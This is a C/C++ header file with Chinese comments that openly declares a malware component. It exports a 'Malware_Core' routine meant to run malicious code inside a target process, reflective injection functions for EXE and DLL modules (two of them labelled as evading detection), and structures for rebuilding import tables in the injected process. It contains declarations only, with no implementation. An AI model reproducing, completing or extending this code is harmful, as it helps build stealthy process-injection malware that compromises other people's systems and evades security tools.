#pragma once
#include "pch.h"


extern "C" _declspec(dllexport)  DWORD WINAPI Malware_Core(LPVOID lpThreadParameter);//在目标进程中执行的恶意代码(需负责修复IAT表)
extern "C" _declspec(dllexport)  LPVOID GetMalwareParam();			//用于导出全局变量的地址
VOID Malware_HandleParam(PEBODY PEBody, DWORD64 virtualAddr);		//用于处理malware的全局变量参数
VOID ReflectInject_EXE(const CHAR* processName);					//注入当前exe模块（必须编译为release时，exe才有重定位表）
VOID ReflectInject_EXE_AntiDetect_20190606(const CHAR* processName);//注入当前exe模块，反OW检测机制（必须编译为release时，exe才有重定位表）
VOID ReflectInject_DLL_AntiDetect_20190606(const CHAR* processName,const char* dllPath);//注入外部DLL模块，反OW检测机制

//===================MalWare所需的参数===================================================
struct MALWARE_IAT
{
	DWORD funcAddr[200];	//函数地址(需足够大)
	int numOfItem_pri;		//私有：标识当前IAT表中有几个项
};
struct MALWARE_INT
{
	//若值的最高二进制位=1，则其余位存放"函数名称序号"
	//若值的最高二进制位=0，则存放RVA值，指向一个_IMAGE_IMPORT_BY_NAME结构(系统类库已定义此结构)
	DWORD IMAGE_THUNK_DATA[200]; //需足够大
	int numOfItem_pri;			 //私有：标识当前INT表中有几个项
};
struct MALWARE_PARAM
{
	int numOfImportDirectory;
	DWORD64 virtualAddr;		//从目标进程中申请到的基址
	IMPORT_DIRECTORY ImportDirectory[100];		//需足够大
	MALWARE_IAT IAT_Malware[100];				//需足够大
	MALWARE_INT INT_Malware[100];				//需足够大
};
//========================================================================================
